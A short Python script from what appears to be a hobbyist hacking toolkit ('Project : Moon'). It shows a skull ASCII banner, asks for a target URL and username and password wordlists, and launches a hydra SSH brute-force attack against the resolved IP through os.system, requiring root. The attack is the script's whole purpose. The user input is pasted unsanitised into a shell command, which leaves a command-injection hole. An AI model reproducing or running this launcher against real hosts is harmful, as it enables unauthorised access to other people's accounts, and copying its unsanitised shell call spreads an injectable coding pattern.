from os import *
from colorama import *
from rich.tree import Tree
from rich import print as rprint
import socket
import time
import argparse
import sys
from ftplib import FTP

def menu():
    hostname=socket.gethostname()   
    ip=socket.gethostbyname(hostname) 
    print(Fore.BLACK+f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠛⠛⠉⠉⠩⠥⠤⠤⠤⠄⢀⣉⣛⣷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⢊⡡⠖⠚⠦⣤⡄⠖⠂⠀⠀⠀⠀⠀⠀⢹⣏⠉⠛⢻⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡠⢊⡵⠊⠁⢀⣀⣤⠾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⢤⣈⡻⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣰⣯⠴⠉⠀⠉⠉⠉⠛⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣦⡀⠈⠉⢻⣿⣿⣿⠿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢠⠿⣿⠃⠀⠀⣤⠀⠀⢀⣤⣶⠶⣶⣶⣦⣄⢀⣠⠀⠀⠀⠀⠈⣿⠉⠙⢶⡄⠈⠻⣿⣍⠀⠀⠻⣷⡀⠀⠀⠀
⠀⠀⢠⠎⡴⠁⠀⠀⣠⠏⠀⣠⡿⣫⠴⠛⠉⠉⠉⢿⣿⡇⠀⠀⠀⠀⠀⠘⠁⠀⠈⡇⠀⠀⠈⢻⡀⠀⠀⠸⣿⣆⠀⠀
⠀⢀⠏⡼⠀⠀⠀⠐⠁⠀⣠⡟⠼⠁⠀⠀⠀⠀⠀⠈⠻⠋⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⢣⠀⣶⣶⣿⣿⡆⠀
⢀⡎⣼⡇⠀⡀⠀⠀⠀⠻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢸⡏⠹⣿⣿⠀
⣼⢰⣿⡇⢠⣷⢤⡀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠤⡀⠀⠀⢀⠀⣀⠈⢇⠀⣿⣿⣆
⡇⣾⡿⠀⣿⠁⠀⠀⠀⠀⠀⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢞⠀⢈⠃⠈⣿⣿⣿⢹
⣇⣿⠁⠀⠹⡶⠖⠀⠀⠀⠀⠀⠹⣷⣦⣤⣔⣶⡶⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢤⣾⠀⢀⢸⣿⣿⣾
⢹⣿⠀⠀⠀⠀⠀⠀⠛⠂⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠊⠁⠀⠘⠃⠀⣿⣾⣿⣿⡟
⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠤⠼⠟⠻⣿⣿⡇
⠀⢿⣇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⡀⠀⠀⢀⣿⣿⠀
⠀⠘⣿⡀⠸⡀⠀⠀⢠⠃⠀⠀⠀⡀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⣼⠃⠀⣤⣼⣿⠇⠀
⠀⠀⠘⣷⠀⠱⡄⠀⡆⣀⠴⠒⠉⠀⠀⢠⣤⠴⠞⠛⠳⣤⠀⠀⠀⠀⠀⠳⢦⣄⡀⠀⢀⣀⣄⠰⣿⣤⢞⣿⣿⠏⠀⠀
⠀⠀⠀⠘⢷⡄⠿⣾⣾⠁⠀⠀⠀⠀⠀⢸⡃⠀⠀⠀⢀⡘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣀⣉⣵⠟⣡⠏⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣆⣻⡛⢦⣀⠀⠀⠀⠀⠀⠳⢦⣄⠠⠞⠛⠁⠀⠀⠀⣠⣴⣤⣤⣴⣾⣿⠟⣿⣿⣿⣯⠞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⣿⣦⣙⠳⣄⡀⠀⣄⡀⠀⠙⠄⠀⠀⣀⣀⠄⠚⠛⠻⣿⣿⡿⠋⣡⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣆⡉⠓⠦⠄⣀⠀⠐⠛⠉⠉⠁⢀⣀⣤⣶⣿⣩⣴⣾⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣶⣴⣾⣷⣶⣾⣿⣿⠾⠿⠟⢛⣛⣻⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠛⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                        ©️ Project : Moon Copright to TheSadError

                        ---INFO---
                        DIR : /moon/crack/
                        IP  : {ip}
    """)


def main():
    url = input(Fore.RED+"[!] Enter Target URL : ")
    ip = socket.gethostbyname(url)
    us = input(Fore.RED+"[!] Enter Username Wordlist : ")
    wr = input(Fore.RED+"[!] Enter Password Wordlist : ")
    print(Fore.BLUE+f"""
    Starting SSH Server Brute Force!
    Target IP : {ip}
    """)
    system(f"hydra -L {us} -P {wr} ssh://{ip}")

if __name__ == "__main__":
    user = geteuid()
    if user == 0:
        system("clear")
        main()
    else:
        print(Fore.RED+"[!] WARNING : Mr. Moon need superuser privileges! Please run code by sudo!")
